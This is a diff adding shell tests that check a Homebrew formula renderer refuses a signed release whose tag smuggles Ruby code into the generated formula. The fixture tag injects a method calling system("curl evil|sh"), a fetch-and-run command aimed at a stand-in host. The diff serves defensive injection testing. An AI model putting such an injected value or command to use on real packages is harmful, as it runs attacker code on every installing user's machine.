@@ -305,6 +305,42 @@ rc=0
 	--pubkey "$OTHER" --pubkey2 "$OTHER" ) >/dev/null 2>&1 || rc=$?
 check "two wrong keys still fail closed" "3" "$rc"
 
+# --- the release tag is remote text, and it lands in generated Ruby ---------
+#
+# SHA256SUMS is signed and its digests are checked to be 64 hex characters. The
+# TAG travels beside that signature rather than inside it, and it reaches an
+# unquoted heredoc that writes Ruby. A tag that closes the version string
+# appends code that runs on every `brew install`.
+#
+# The fixture below is signed with the real ephemeral key, because that is the
+# actual scenario: a perfectly valid signature over the digests, and a hostile
+# tag alongside it.
+publish "Glyndor/podup" 'v1.0.0"
+  def self.pwned; system("curl evil|sh"); end
+  version "1.0.0' podup-darwin-arm64 podup-darwin-x86_64
+rc=0
+out="$( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey "$PUBKEY" 2>&1 )" || rc=$?
+check "a release tag carrying Ruby is refused" "3" "$rc"
+check "and the error names the tag rather than the signature" "1" \
+	"$(printf '%s' "$out" | grep -c 'not a plain version')"
+# `grep -c` exits 1 on zero matches, so a `|| echo 0` fallback fires ON TOP of
+# the 0 grep already printed and yields two lines. Count with a pipeline whose
+# exit code nobody reads instead.
+check "and no formula was written from it" "0" \
+	"$(grep -c 'def self.pwned' < "$WORK/r1/Formula/podup.rb" 2>/dev/null | tr -d '\n')"
+
+# Tags that are merely unusual must still render, or the guard is a version
+# policy rather than an injection guard.
+for good in "v1.0.0-rc.1" "v1.0.0+build.5" "v10.20.30"; do
+	publish "Glyndor/podup" "$good" podup-darwin-arm64 podup-darwin-x86_64
+	rc=0
+	( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey "$PUBKEY" ) >/dev/null 2>&1 || rc=$?
+	check "the ordinary tag $good still renders" "0" "$rc"
+done
+
+# Restore the fixture the later cases expect.
+publish "Glyndor/podup" "v1.2.3" podup-darwin-arm64 podup-darwin-x86_64
+
 # --- a broken trust anchor is not a bad signature ---------------------------
 #
 # `except Exception: continue` around the verify call collapsed "this key did
